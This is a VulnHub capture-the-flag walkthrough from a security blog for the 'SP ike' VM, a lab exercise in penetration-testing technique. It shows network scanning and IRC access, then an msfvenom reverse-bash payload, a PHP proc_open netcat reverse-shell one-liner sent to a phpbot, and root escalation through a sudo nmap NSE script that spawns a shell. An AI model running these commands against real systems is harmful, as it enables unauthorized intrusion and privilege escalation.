<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">SP ike: Vulnhub Lab Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/sp-ike-vulnhub-lab-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-05-01T12:06:25+00:00">May 1, 2019</time><time class="updated" datetime="2025-06-10T20:11:44+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello friends! Today we are going to take another CTF challenge known as “SP ike”. The credit for making this VM machine goes to “Daniel Solstad”. Our goal is to get flags to complete the challenge.</span></p>
<p><span style="color: #000000;">Security Level: Intermediate</span></p>
<h3><span style="color: #800000;"><strong>Penetrating Methodology:</strong></span></h3>
<ul>
<li><span style="color: #000000;">Discovering Targets IP</span></li>
<li><span style="color: #000000;">Network scanning (Nmap)</span></li>
<li><span style="color: #000000;">Surfing HTTP service port</span></li>
<li><span style="color: #000000;">Configuring HEXCHAT IRC Client</span></li>
<li><span style="color: #000000;">Connecting to IRC Server</span></li>
<li><span style="color: #000000;">Creating PHP Malicious Script using MSFvenom</span></li>
<li><span style="color: #000000;">Using Netcat Listener</span></li>
<li><span style="color: #000000;">Spawning TTY Shell</span></li>
<li><span style="color: #000000;">Getting Root Access</span></li>
<li><span style="color: #000000;">Reading Final Flag</span></li>
</ul>
<h3><span style="color: #800000;"><strong>Walkthrough</strong></span></h3>
<p><span style="color: #000000;">Let’s start off with scanning the network to find our target.</span></p>
<pre class="lang:default decode:true">netdiscover</pre>
<p><img decoding="async" src="//1.bp.blogspot.com/-7jNgcRLtDuo/XMmJ_G_W5QI/AAAAAAAAeJI/GJFXBOLNrSsJ8Ybe6yUveyQ9jU980bvYACLcBGAs/s1600/1.png"/></p>
<p><span style="color: #000000;">We found our target –&gt; <strong>192.168.1.21</strong></span></p>
<p><span style="color: #000000;">Time to scan the Target’s IP with nmap. Nmap scan result shows FOUR open ports, 80(http), 139(NetBIOS-ssn), 445(NetBIOS-ssn), 6667(IRC).</span></p>
<pre class="lang:default decode:true">nmap -sV -T4 192.168.1.21</pre>
<p><img decoding="async" src="//4.bp.blogspot.com/-2_SjedQn1PU/XMmJ_PALYZI/AAAAAAAAeJM/Wwj2r01Tf-oz07R0GQr4oDPb9ZB-myl0QCLcBGAs/s1600/2.png"/></p>
<p><span style="color: #000000;">Since port 80 is running HTTP, so we thought of browsing Target’s IP in our browser. But it is not much of great help. Moving on.</span></p>
<p><img decoding="async" src="//4.bp.blogspot.com/-ptnNjliOu0g/XMmJ_z5PPvI/AAAAAAAAeJQ/tuBQDPAes_ERhTb2GxZNP99Yq7svkX53wCLcBGAs/s1600/3.png"/></p>
<p><span style="color: #000000;">Even directory scanning using dirb tool was not very useful. At last, we are left with the IRC chat server on port(6667). So, we used an IRC client <strong>Hexchat</strong> to connect to the port(6667). First, we need to configure <strong>Hexchat by Adding a New Profile and Editing Connection Details.</strong></span></p>
<p><img decoding="async" src="//1.bp.blogspot.com/-Zq4qQhaztEM/XMmKAFiD6_I/AAAAAAAAeJU/sBmEl0X3bbki8GXLII9j5IJAqE4hFdGIQCLcBGAs/s1600/4.png"/></p>
<p><span style="color: #000000;">Now Edit the Network ike which we have added and Give the Target’s IP as you can see in the image.</span></p>
<p><img decoding="async" src="//4.bp.blogspot.com/-vIJxJIKCXX8/XMmKAyVjndI/AAAAAAAAeJY/E-D4oPvsJnE-hoWLojfoZ8HRiDxc3d68wCLcBGAs/s1600/5.1.png"/></p>
<p><span style="color: #000000;">We have successfully connected to the IRC Server. And we found something interesting that the server has a channel #php which has a phpbot, I guess it wouldn’t be a problem for the phpbot to execute a php script.</span></p>
<p><span style="color: #000000;"><strong> <img decoding="async" src="//4.bp.blogspot.com/-vGB0s_wmrZg/XMmKBQSOZ3I/AAAAAAAAeJc/DB8EBAzJ_ssiTqmcWSWxojlXkpjMVgukQCLcBGAs/s1600/5.png"/></strong></span></p>
<p><span style="color: #000000;">We created a msfvenom script to exploit the target machine. We used the reverse_netcat payload to create this script.</span></p>
<pre class="lang:default decode:true">msfvenom -p cmd/unix/reverse_bash lhost=192.168.1.34 lport=1234 R</pre>
<p><img decoding="async" src="//3.bp.blogspot.com/-qTXcWNMmohY/XMmKBwKj4uI/AAAAAAAAeJg/HlnK1S2qz_MwBQxdaN2xzqownRdHonKmQCLcBGAs/s1600/7.png"/></p>
<p><span style="color: #000000;">After making a few tries, we finally able to execute our PHP script successfully. To get reverse shell execute the script given below.</span></p>
<pre class="lang:default decode:true">!php $s=array(); $p=array(); proc_open("mkfifo /tmp/tsglu; nc 192.168.1.34 1234 0&lt;/tmp/tsglu | /bin/sh &gt;/tmp/tsglu 2&gt;&amp;1; rm /tmp/tsglu", $s, $p);</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="//3.bp.blogspot.com/-XwI5QTdm5KU/XMmKCBAqX2I/AAAAAAAAeJk/6V4As-38dhsiiqzx5JsqpSAwktEFibE3gCLcBGAs/s1600/8.png"/></strong></span></p>
<p><span style="color: #000000;">Oh Yeah!! We got the reverse shell, but it is not a proper shell. We will spawn a tty shell using python. After doing sudo -l, we saw nmap can be used with root privileges. So to get root, we used commands given below and successfully got root access. Time to read the FLAG!!</span></p>
<pre class="lang:default decode:true  ">nc -lvp 1234
python -c 'import pty;pty.spawn("/bin/bash")'
echo "os.execute('/bin/sh')" &gt; /tmp/shell.nse
sudo nmap --script=/tmp/shell.nseid
cd /root
ls
cat flag.txt</pre>
<p><img decoding="async" src="//1.bp.blogspot.com/-Iq1VeWK7ILE/XMmJ_Jg7QkI/AAAAAAAAeJE/YEJB_z5-SI0YmiO4ETPjbU-Z1lDEyzi4gCLcBGAs/s1600/12.png"/></p>
<p><span style="color: #000000;"><strong>Author:</strong> Ashray Gupta is a Security Researcher and Technical Writer at Hacking Articles. Contributing his 2 years in the field of security as a Penetration Tester and Forensic Computer Analyst. Contact <strong><a style="color: #000000;" href="//www.linkedin.com/in/ashray-gupta-b77221b6/">Here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
